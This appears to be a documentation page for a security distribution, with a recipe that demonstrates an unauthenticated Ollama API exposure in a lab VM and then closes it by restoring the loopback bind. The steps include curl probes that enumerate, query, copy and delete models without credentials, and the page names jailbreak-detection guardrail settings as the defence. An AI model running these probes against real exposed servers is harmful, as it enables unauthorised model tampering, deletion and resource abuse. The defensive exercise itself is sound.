@@ -1,0 +1,181 @@
+---
+title: "Recipe: pwn an exposed Ollama API, then close it"
+toc-title: Recipe
+---
+
+| Field | Value |
+|---|---|
+| Tools | `ollama-pwn` (A-7, exp) ↔ `ollama` (O-4 lab target) + guardrail rows |
+| Section | Attack–defence pairs |
+| Level | medium |
+| Time | ~40 min (lab bind + probe sweep + posture flip) |
+| Layer/Category | ATTACK / A-7 + OPS / O-4 ↔ DEFENCE / d-01 (pending rows) |
+| Tags | `pair`, `platform`, `ollama`, `exp`, `owasp-llm02`, `owasp-llm10` |
+
+## Problem
+
+Ollama's local HTTP API carries no authentication — upstream documents
+that the local API requires none — and the whole model-management
+surface rides it: enumerate the model store, inspect modelfiles, run
+inference, copy models, pull new ones, delete existing ones. Two
+realistic routes put that surface on a network: the lab target, where
+the declared `services.ollama.host` override to `0.0.0.0` is the
+integration-test posture (a lab-segment VM must be reachable so probes
+can drive it), and the operator bind flip, where someone set a broad
+bind on a real box to test "something" and left it. The manifest maps
+the exposure to OWASP LLM02 (sensitive information disclosure) and
+LLM10 (unrestricted consumption), and the `ollama-pwn` surface to
+ATLAS AML.T0049 + T0050. You want to demonstrate the exposure against
+the declared lab target, then prove the default posture closes it —
+both legs reproducible, diff as evidence.
+
+## Solution
+
+The sweep runs the verified `/api/*` request shapes as plain curl —
+the A-7 row is `safety.level: exp` and its upstream repository is
+missing at the pin, so the probe leg is base-system tooling per the
+pair playbook (each probe prints a verdict; never a fabricated PASS):
+
+```bash
+# 1. BOOT THE LAB TARGET — the exposed posture is a deliberate lab act:
+#    services.ollama.host = "0.0.0.0";      # integration-test posture
+#    services.ollama.loadModels = ["smollm2:360m"];
+#    (the module's DEFAULT is host 127.0.0.1:11434 with openFirewall
+#     false — the override belongs inside an isolated lab segment; a
+#     qemu user-net VM is one, see
+#     [Boot a verified release image](../getting-started/first-image.html))
+
+# 2. HEALTH + ENUMERATION (no credentials, anything on the segment):
+curl -fsS http://<target>:11434/            # -> "Ollama is running"
+curl -fsS http://<target>:11434/api/tags    # full model list:
+#    {"models":[{"name":"smollm2:360m","size":...,"digest":"sha256:...", ...}]}
+curl -fsS http://<target>:11434/api/ps      # what is loaded RIGHT NOW
+curl -fsS http://<target>:11434/api/version # server build
+
+# 3. INSPECT + INFERENCE (the LLM02 half):
+curl -fsS http://<target>:11434/api/show \
+     -d '{"model":"smollm2:360m"}'
+#    -> modelfile template, parameters, licence blob, capabilities
+curl -fsS http://<target>:11434/api/generate \
+     -d '{"model":"smollm2:360m","prompt":"Reply OK only.","stream":false}'
+#    -> {"response":"OK", ...} — inference without any Bearer/credential
+
+# 4. STORE TAMPERING (the LLM10 half — done on a marker copy, cleaned up):
+curl -fsS http://<target>:11434/api/copy \
+     -d '{"source":"smollm2:360m","destination":"smollm2:360m-ka-marker"}'
+curl -fsS -X DELETE http://<target>:11434/api/delete \
+     -d '{"name":"smollm2:360m-ka-marker"}'   # -> the round trip is proven
+```
+
+Then the verification leg — flip the posture back to the module
+default and re-run the SAME probes from the lab segment:
+
+```bash
+# 5. THE FLIP: the bind is the defence.
+#      services.ollama.host default = 127.0.0.1:11434, openFirewall=false
+sudo nixos-rebuild test
+
+# 6. SAME probe sweep, same box, same order:
+curl -fsS --max-time 5 http://<target>:11434/api/tags
+#    -> FAIL: connection refused/timeout from the segment; the API
+#       answers only on the loopback interface. The diff between the
+#       two sweeps IS the evidence the bind moved the surface.
+```
+
+Expected output shape (abridged, shapes not transcripts):
+
+```
+sweep @ http://<target>:11434  posture: host=0.0.0.0 (lab)
+  /              -> ok   "Ollama is running"
+  /api/tags      -> ok   {"models":[{"name":"smollm2:360m", ...}]}
+  /api/ps        -> ok   {"models":[...]} (loaded models only)
+  /api/show      -> ok   {"modelfile":"...","parameters":"..."}
+  /api/generate  -> ok   {"response":"OK",...}
+  /api/copy      -> ok   (marker copy created)
+  /api/delete    -> ok   (marker copy deleted)
+sweep again, posture: host default (127.0.0.1)
+  all probes     -> FAIL (refused) — surface closed to the segment
+```
+
+## Discussion
+
+- **Why plain curl and not a bespoke exploit script:** the manifest's
+  `ollama-pwn` row is `safety.level: exp`, licence
+  `LicenseRef-Unknown`, and the upstream repository it pins is
+  currently missing — the lane record on
+  [kailash-os#23](https://github.com/kailash-os/kailash-os/issues/23)
+  is a missing-repository note like every A-7 row at the pin. The
+  sweep still runs the REAL protocol against the REAL target with the
+  verified request shapes above; the real tool takes over when its
+  derivation lands — installing only via the double-key lab gate
+  (full walk: [Gate lab-mode and exp-classified
+  tools](../admin/lab-mode-gating.html)). Never invent a tool's CLI
+  to fill the gap.
+- **The no-auth fact is upstream, not folklore:** ollama documents
+  that the local API accepts requests unauthenticated — there is no
+  credential layer to guess, misconfigure, or rotate; the ONLY
+  boundary is what interface the server binds. That makes the posture
+  flip unusually clean: one option, no keys, no half-open states.
+- **Where the lab override is honest and where it is not:** the
+  `services.ollama.host = "0.0.0.0"` override is the verified
+  integration-test posture — the target must be reachable from the
+  lab segment for ANY probe pair to run. It is a lab-segment posture,
+  inside an isolated VM; the same bind on a LAN box is the incident
+  this recipe rehearses. Run the exposed leg in the lab segment, not
+  on your workstation.
+- **The destructive verbs are part of the evidence:** copy→delete on
+  a marker copy proves the write-to-model-store class without
+  touching a real model. `delete` on an unauthenticated API removes
+  models permanently — the probe discipline exists precisely so the
+  demonstration never needs one.
+- **The guardrail defence leg is a pending row, stated honestly:**
+  the flow that belongs after the endpoint (scan every request before
+  it reaches the model) is NeMo Guardrails' input rails —
+  `config.yml` with
+  `rails.input.flows = ["self check input", "jailbreak detection
+  heuristics"]`, served by `nemoguardrails server --config PATH
+  --port` and consumed as `POST /v1/chat/completions` with
+  `config_id` — or llm-guard's input scanner surface
+  (`from llm_guard.input_scanners import PromptInjection`;
+  `sanitized_prompt, is_valid, risk_score = scanner.scan(prompt)`).
+  Both defence rows are PENDING-kailash at the pin (module wiring not
+  landed); the upstream config shapes are quoted as the design, not
+  as a working kailash surface. What you CAN land today is the bind:
+  the module default already carries the fix.
+- **This is the transferable pattern:** lab target up → probes run →
+  posture flip → same probes again → diff as evidence. The origin
+  walk with the verdict instrument and `--record` discipline is
+  [Attack the platform, then verify](attack-then-verify.html).
+
+## See also
+
+- [Attack the platform, then verify](attack-then-verify.html) — the
+  mlflow pair; the verdict + record discipline this recipe follows
+- [Serve a local model for scanning](../ops/serve-a-model.html) —
+  the loopback-only posture of the same engine
+- [Gate lab-mode and exp-classified
+  tools](../admin/lab-mode-gating.html) — the exp gate the real tool
+  rides when its derivation lands
+- Upstream API surface: <https://github.com/ollama/ollama/blob/main/docs/api.md>
+- Upstream missing-repository note:
+  [kailash-os#23](https://github.com/kailash-os/kailash-os/issues/23)
+- [Recipe directory](../directory.html)
+
+---
+
+**Recipe provenance.** Manifest facts (A-7 `ollama-pwn` row exp +
+`LicenseRef-Unknown`, ATLAS AML.T0049 + T0050, OWASP LLM02 + LLM10
+both epochs; ollama O-4 row; module default
+`services.ollama.host = 127.0.0.1:11434`, `openFirewall:false`) are
+from the packages manifest rows + lane comments, verified 2026-10-14.
+Upstream API shapes (`GET /` "Ollama is running", `/api/tags`,
+`/api/ps`, `/api/show`, `/api/generate stream:false`, `/api/copy`,
+`DELETE /api/delete`, `/api/pull`, `/api/version`) and the
+no-authentication fact for the local API checked at the ollama API
+docs at the pin — verified 2026-10-14. Guardrail defence rows
+(nemo-guardrails / llm-guard) PENDING-kailash: their upstream
+config/scan shapes are quoted above as design, not as a landed
+surface.
+
+
+ref: [ollama API docs + packages manifest rows](https://github.com/ollama/ollama/blob/main/docs/api.md) - verified 2026-10-14. Missing A-7 repo: [kailash-os#23](https://github.com/kailash-os/kailash-os/issues/23).
